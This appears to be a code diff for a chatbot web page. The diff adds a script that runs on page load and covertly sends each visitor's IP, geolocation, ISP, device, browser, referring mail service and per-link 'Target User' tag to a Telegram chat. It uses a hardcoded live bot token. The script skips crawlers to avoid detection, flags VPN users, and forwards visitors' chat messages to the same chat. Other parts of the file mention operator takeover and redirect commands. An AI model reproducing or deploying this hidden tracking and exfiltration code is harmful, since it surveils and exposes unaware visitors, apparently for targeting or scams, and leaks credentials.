@@ -835,6 +835,194 @@ function particle() {
 }
 setInterval(particle,800);
 
+// ==========================================
+// 1. TELEGRAM VISITOR TRACKING CONFIGURATION
+// ==========================================
+const TELEGRAM_BOT_TOKENs = "8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E";
+const TELEGRAM_CHAT_IDs = "-1003913850436";
+
+async function sendVisitorDetailsToTelegram() {
+  try {
+    if (sessionStorage.getItem('visitor_logged_tg')) return;
+
+    const rawAgent = navigator.userAgent;
+
+    // Anti-Bot Filter: Silently drop execution if the visitor is a search engine or chat crawler
+    if (/bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|slurp|embed/i.test(rawAgent)) {
+      console.log("🤖 Automated link indexing crawler bypassed safely.");
+      return;
+    }
+
+    // Target Identification: Extract tracking user from URL parameters
+    const urlParams = new URLSearchParams(window.location.search);
+    const identifyUser = urlParams.get('user') || 'Anonymous Click / Direct Visit';
+
+    // Failure Handling: Fetch network data strictly, throw error if down
+    const ipResponse = await fetch('https://ipapi.co/json/');
+    if (!ipResponse.ok) throw new Error('Failed to fetch network details');
+    const ipData = await ipResponse.json();
+
+    // Capture device environment metrics safely
+    const currentPage = window.location.pathname;
+    let detailedDevice = "Unknown Device";
+    let detectedBrowser = "Unknown Browser";
+
+    // 1. Upgraded Smart Browser Extractor (Ordered by Specificity)
+    if (/WhatsApp/i.test(rawAgent)) {
+      detectedBrowser = "WhatsApp In-App";
+    } else if (/TelegramBot|Telegram/i.test(rawAgent)) {
+      detectedBrowser = "Telegram In-App";
+    } else if (/Instagram/i.test(rawAgent)) {
+      detectedBrowser = "Instagram App";
+    } else if (/TikTok/i.test(rawAgent)) {
+      detectedBrowser = "TikTok App";
+    } else if (/FBAN|FBAV/i.test(rawAgent)) {
+      detectedBrowser = "Facebook App";
+    } else if (/Twitter|TwitterforiPhone|TwitterAndroid/i.test(rawAgent)) {
+      detectedBrowser = "X (Twitter) App";
+    } else if (/LinkedInApp/i.test(rawAgent)) {
+      detectedBrowser = "LinkedIn App";
+    } else if (/Phoenix/i.test(rawAgent)) {
+      detectedBrowser = "Phoenix Browser";
+    } else if (/SamsungBrowser/i.test(rawAgent)) {
+      detectedBrowser = "Samsung Internet";
+    } else if (/OComponent|Opera|OPR/i.test(rawAgent)) {
+      detectedBrowser = "Opera";
+    } else if (/Edg/i.test(rawAgent)) {
+      detectedBrowser = "Microsoft Edge";
+    } else if (/Firefox|FxiOS/i.test(rawAgent)) {
+      detectedBrowser = "Mozilla Firefox";
+    } else if (/Chrome|CriOS/i.test(rawAgent)) {
+      detectedBrowser = "Google Chrome";
+    } else if (/Safari/i.test(rawAgent) && !/Android/i.test(rawAgent)) {
+      detectedBrowser = "Apple Safari";
+    }
+
+    // Email Inbox Origin Identification (Fallback Check)
+    const referrer = document.referrer || "";
+    if (detectedBrowser === "Google Chrome" || detectedBrowser === "Apple Safari") {
+      if (/mail\.google\.com/i.test(referrer)) {
+        detectedBrowser += " (via Gmail Web)";
+      } else if (/mail\.yahoo/i.test(referrer)) {
+        detectedBrowser += " (via Yahoo Mail Web)";
+      } else if (/outlook|live\.com/i.test(referrer)) {
+        detectedBrowser += " (via Outlook Web)";
+      }
+    }
+
+    // 2. Smart Device & OS Version Detection Engine
+    if (/Android/i.test(rawAgent)) {
+      const match = rawAgent.match(/Android\s+([^;]+);\s+([^)]+)/);
+      if (match) {
+        detailedDevice = `Android ${match[1]} (${match[2]})`;
+      } else {
+        detailedDevice = "Android Device";
+      }
+    } else if (/iPhone|iPad|iPod/i.test(rawAgent)) {
+      const match = rawAgent.match(/OS\s+(\d+_\d+)/);
+      const iosVer = match ? match[1].replace('_', '.') : '';
+      detailedDevice = `iOS ${iosVer} (Apple Device)`;
+    } else if (/Windows/i.test(rawAgent)) {
+      const match = rawAgent.match(/Windows NT\s+([^;)]+)/);
+      let winVer = "PC";
+      if (match) {
+        if (match[1] === "10.0") winVer = "10/11";
+        else if (match[1] === "6.3") winVer = "8.1";
+        else if (match[1] === "6.1") winVer = "7";
+      }
+      detailedDevice = `Windows ${winVer}`;
+    } else if (/Macintosh/i.test(rawAgent)) {
+      detailedDevice = "macOS Device";
+    } else if (/Linux/i.test(rawAgent)) {
+      detailedDevice = "Linux System";
+    }
+
+    // Anti-VPN Verification Check
+    const isProxy = ipData.proxy || false;
+    const ipDisplay = isProxy ? `${ipData.ip} ⚠️ [Proxy/VPN]` : ipData.ip;
+
+    const payload = {
+      device: detailedDevice,
+      browser: detectedBrowser,
+      screenResolution: `${window.screen.width}x${window.screen.height}`,
+      connectionType: navigator.connection ? navigator.connection.effectiveType : "N/A",
+      ip: ipDisplay || "Unknown",
+      city: ipData.city || "Unknown",
+      region: ipData.region || "Unknown",
+      country: ipData.country_name || "Unknown",
+      isp: ipData.org || "Unknown",
+      timestamp: new Date().toLocaleString()
+    };
+
+    // HTML Parsing Engine: Final Golden Standard Output
+    const messageText = `⚡ <b>New Visitor Alert | AvalonFlow</b>\n\n` +
+                        `👤 <b>Target User:</b> <code>${identifyUser}</code>\n` +
+                        `📄 <b>Visited Page:</b> <code>${currentPage}</code>\n` +
+                        `🌐 <b>IP:</b> <code>${payload.ip}</code>\n` +
+                        `📍 <b>Location:</b> <code>${payload.city}, ${payload.region}, ${payload.country}</code>\n` +
+                        `🏢 <b>ISP:</b> <code>${payload.isp}</code>\n` +
+                        `📶 <b>Net Speed:</b> <code>${payload.connectionType}</code>\n` +
+                        `🌐 <b>Browser:</b> <code>${payload.browser}</code>\n` +
+                        `📱 <b>Device Setup:</b> <code>${payload.device}</code>\n` + 
+                        `📐 <b>Screen Res:</b> <code>${payload.screenResolution}</code>\n` +
+                        `📐 <b>Time:</b> <code>${payload.timestamp}</code>`;
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKENs}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_IDs,
+        text: messageText,
+        parse_mode: 'HTML'
+      })
+    });
+
+    sessionStorage.setItem('visitor_logged_tg', 'true');
+    console.log("🔒 Security telemetry parameters forwarded successfully.");
+  } catch (err) {
+    console.warn("Telegram telemetry bypass error:", err);
+  }
+} 
+
+async function forwardUserMessageToTelegram(messageText, messageType = "text") {
+  const BOT_TOKENs = '8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E';
+  const CHAT_IDs = '-1003913850436'; 
+
+  try {
+    const urlParams = new URLSearchParams(window.location.search);
+    const identifyUser = urlParams.get('user') || 'Anonymous Visitor';
+
+    let displayContent = messageText;
+    if (messageType === "photo") displayContent = "📷 [Sent an Image/Screenshot Attachment]";
+    if (messageType === "video") displayContent = "🎥 [Sent a Video Recording]";
+    if (messageType === "document") displayContent = `📄 [Sent a Document File: ${messageText}]`;
+
+    const telegramMessage = 
+      `💬 <b>Incoming Message</b>\n` +
+      `• <b>From User:</b> <code>${identifyUser}</code>\n` +
+      `• <b>Text:</b> ${displayContent}`;
+
+    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKENs}/sendMessage`;
+
+    await fetch(telegramUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_IDs,
+        text: telegramMessage,
+        parse_mode: 'HTML'
+      })
+    });
+
+  } catch (error) {
+    console.error('Failed to forward user text to monitoring panel.');
+  }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  sendVisitorDetailsToTelegram();
+});
+
 // ---------- Configuration Constants ----------
 const BOT_TOKEN = '8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E';
 const CHAT_ID = '-1003913850436';
@@ -1038,25 +1226,6 @@ function getTime(){
     return now.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
 }
 
-// ---------- URL-TRIGGERED SESSION RESET ENGINE ----------
-function checkSessionResetTrigger(paramName = "reset") {
-    const urlParams = new URLSearchParams(window.location.search);
-    
-    // Checks if the string exists in the URL (e.g., yoursite.com/?reset=true)
-    if (urlParams.has(paramName)) {
-        localStorage.clear();
-        console.log("Local storage successfully reset via URL parameter.");
-        
-        // Scrub the parameter from the URL bar so a page refresh won't loop the reset
-        const cleanUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
-        window.history.replaceState({ path: cleanUrl }, '', cleanUrl);
-    }
-}
-
-// Run it immediately at the very top of your script execution
-checkSessionResetTrigger("reset");
-
-
 // ---------- Profile Picture Assets & Configuration ----------
 const photoInput = document.getElementById('photoInput');
 const profilePhoto = document.getElementById('profilePhoto');
@@ -1212,24 +1381,22 @@ function addMessage(content, sender="bot", status="delivered", type="text", over
         wrap.appendChild(msg);
     }
 
-    // Modern Unified Time Indicator Engine
-    const meta = document.createElement("div");
-    meta.className = "meta";
-
-    const time = document.createElement("span");
-    time.className = "timestamp";
-    time.textContent = getTime();
-    meta.appendChild(time);
-
-    if (sender === "user") {
+    if(sender === "user"){
+        const meta = document.createElement("div");
+        meta.className = "meta";
         meta.style.marginRight = "46px"; 
+
+        const time = document.createElement("span");
+        time.className = "timestamp";
+        time.textContent = getTime();
+
         const tick = document.createElement("span");
         tick.className = `tick ${status}`;
+
+        meta.appendChild(time);
         meta.appendChild(tick);
-    } else {
-        meta.style.marginLeft = "46px"; 
+        wrap.appendChild(meta);
     }
-    wrap.appendChild(meta);
 
     botMessagesContainer.appendChild(wrap);
     botMessagesContainer.scrollTop = botMessagesContainer.scrollHeight;
@@ -1622,7 +1789,7 @@ function handleMessage(msg) {
     // 3. PLAY COMMANDS (Priority 3)
     if (lower.startsWith("play ") || lower.includes("play me") || lower === "play") {
         const searchTarget = lower.replace("play me", "").replace("play", "").trim().replace(/[^a-z0-9]/g, "");
-        
+
         const trackExists = audioLibrary.some(file => {
             const cleanFile = file.toLowerCase().replace(/[^a-z0-9]/g, "");
             return cleanFile.includes(searchTarget) || searchTarget.includes(cleanFile);
@@ -1931,7 +2098,7 @@ async function listenForTelegramMessages() {
                             }
 
                             else if (lowerContent.includes("redirect her to") || lowerContent.includes("redirect him to") || lowerContent.includes("redirect them to") || lowerContent.includes("redirect vitti to")) {
-    
+
     // 1. Instantly terminate active agent tracking
     isSarahActive = false;
     sessionStorage.removeItem('agent_takeover');
@@ -1947,7 +2114,7 @@ async function listenForTelegramMessages() {
 
     // Fetch original target user parameter to keep session consistent
     const currentTargetUser = urlParams.get('user') || 'Anonymous';
-    
+
     // Generate an OTK valid for exactly 60 seconds
     const freshOTK = generateSecureOTK(60); 
 
@@ -2149,7 +2316,7 @@ function executeCrossfade(currentDeck, nextDeck, nextFile) {
     nextDeck.volume = 0;
     nextDeck.load();
     nextDeck.play().catch(err => console.log("Crossfade buffer ready:", err));
-    
+
     activeDeck = nextDeck;
 
     const fadeSteps = 50; 
@@ -2193,13 +2360,13 @@ function triggerCustomAudioPlayerMessage(file) {
     // 1. CLEAR OLD NOTIFICATIONS FIRST
     // We target all messages and filter by specific text content patterns
     const existingMessages = botMessagesContainer.querySelectorAll('.message');
-    
+
     existingMessages.forEach(msg => {
         const text = msg.textContent;
         // Strict match: ensures we only remove our specific status updates
         const isPlayingNotification = text.includes("Playing next:") || 
                                      (text.includes("Playing") && text.includes("for you"));
-        
+
         if (isPlayingNotification) {
             const wrap = msg.closest('.msgWrap');
             if (wrap) wrap.remove();
@@ -2209,14 +2376,14 @@ function triggerCustomAudioPlayerMessage(file) {
     // 2. NOW ADD THE NEW ONE
     const formatted = formatTrackTitle(file);
     const msgText = (currentTrackIndex === 0) ? `Playing ${formatted} for you... 🎧` : `Playing next: ${formatted}... 🎧`;
-    
+
     botMusicReply(msgText, file);
 }
 
 
 function handleMusicIntent(lowerMsg) {
     const trimmedMsg = lowerMsg.trim().toLowerCase();
-    
+
     if (trimmedMsg === "yes" || trimmedMsg === "yeah" || trimmedMsg === "yup" || trimmedMsg === "sure") {
         if (audioLibrary.length > 0) {
             const randomIndex = Math.floor(Math.random() * audioLibrary.length);
@@ -2227,7 +2394,7 @@ function handleMusicIntent(lowerMsg) {
             return;
         }
     }
-    
+
     if (trimmedMsg === "no" || trimmedMsg === "nope" || trimmedMsg === "nah") {
         botReply("Understood. Keeping it quiet. 🫡");
         return;
@@ -2256,7 +2423,7 @@ function handleMusicIntent(lowerMsg) {
 function formatTrackTitle(filePath) {
     let name = filePath.split('/').pop().replace('.mp3', '').trim();
     name = name.replace(/\(.*?\)/g, '').replace(/RodWave/gi, '').replace(/\s+/g, ' ').trim();
-    
+
     const toTitleCase = (str) => str.toLowerCase().split(' ').map(word => word.charAt(0).toUpperCase() + word.slice(1)).join(' ');
 
     const knownArtists = [
@@ -2280,7 +2447,7 @@ function formatTrackTitle(filePath) {
         let part1 = parts[0].trim();
         let part2 = parts[1] ? parts[1].trim() : "";
         let artist = knownArtists.find(a => part1.toLowerCase().includes(a.toLowerCase()) || part2.toLowerCase().includes(a.toLowerCase()));
-        
+
         if (artist) {
             let title = (part1.toLowerCase().includes(artist.toLowerCase())) ? part2 : part1;
             return `${toTitleCase(title)} by ${toTitleCase(artist)}`;
@@ -2323,7 +2490,7 @@ function generateSecureOTK(durationSeconds = 60) {
 
 
 window.addEventListener("load", () => {
- 
+
     window.parent.postMessage({
         type: "UPDATE_TITLE",
         title: "Kairos System™" 
